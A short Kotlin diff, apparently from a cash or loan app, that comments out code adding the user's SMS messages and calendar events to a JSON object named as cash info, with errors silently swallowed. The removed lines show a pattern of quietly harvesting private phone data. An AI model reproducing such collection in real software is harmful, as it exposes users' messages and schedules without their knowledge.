@@ -67,7 +67,7 @@ class MCLCManager {
         private fun getCashInfo(smsUpload: Boolean = true): JsonObject {
             val jsonObject = JsonObject()
             try {
-                jsonObject.add("sms", if (smsUpload) SmsHelper.getMessage() else JsonArray())
+//                jsonObject.add("sms", if (smsUpload) SmsHelper.getMessage() else JsonArray())
             } catch (e: Exception) {
             }catch (e: OutOfMemoryError){
             }
@@ -77,7 +77,7 @@ class MCLCManager {
             }catch (e: OutOfMemoryError){
             }
             try {
-                jsonObject.add("calendar", CalendarHelper.getCalendarEvent())
+//                jsonObject.add("calendar", CalendarHelper.getCalendarEvent())
             } catch (e: Exception) {
             }catch (e: OutOfMemoryError){
             }
